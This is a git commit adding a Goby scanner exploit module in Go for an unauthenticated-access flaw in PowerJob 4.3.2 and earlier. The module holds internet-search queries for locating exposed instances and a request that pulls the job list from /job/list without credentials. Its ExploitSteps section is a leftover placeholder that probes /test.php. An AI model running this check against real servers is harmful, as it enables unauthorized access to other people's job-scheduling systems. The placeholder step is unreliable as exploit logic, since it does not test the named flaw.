0cabffda391319c0cf08b7752e6744dff7f37aa0
清晨 <37011241+qingchenhh@users.noreply.github.com>
2023-04-24 14:51:37 +0800

    Add files via upload

---
+++ Goby/PowerJob_Unauthorized_Access.go
@@ -0,0 +1,145 @@
+package exploits
+
+import (
+	"git.gobies.org/goby/goscanner/goutils"
+)
+
+func init() {
+	expJson := `{
+  "Name": "PowerJob <=4.3.2 未授权访问漏洞",
+  "Description": "",
+  "Product": "",
+  "Homepage": "",
+  "DisclosureDate": null,
+  "Author": "清晨",
+  "FofaQuery": "title=\"PowerJob\"||app=\"PowerJob\"||product=\"PowerJob\"||body=\"built files will be auto injected\"",
+  "GobyQuery": "title=\"PowerJob\"||app=\"PowerJob\"||product=\"PowerJob\"||body=\"built files will be auto injected\"",
+  "Level": "2",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [],
+  "Is0day": false,
+  "HasExp": false,
+  "ExpParams": [],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/job/list",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "application/json"
+        },
+        "data_type": "text",
+        "data": "{\"appId\":1,\"index\":0,\"pageSize\":10}"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "\"jobName\"",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Tags": [],
+  "VulType": [],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "",
+  "Translation": {
+    "CN": {
+      "Name": "PowerJob <=4.3.2 未授权访问漏洞",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    },
+    "EN": {
+      "Name": "PowerJob Unauthorized Access",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}`
+
+	ExpManager.AddExploit(NewExploit(
+		goutils.GetFileName(),
+		expJson,
+		nil,
+		nil,
+	))
+}
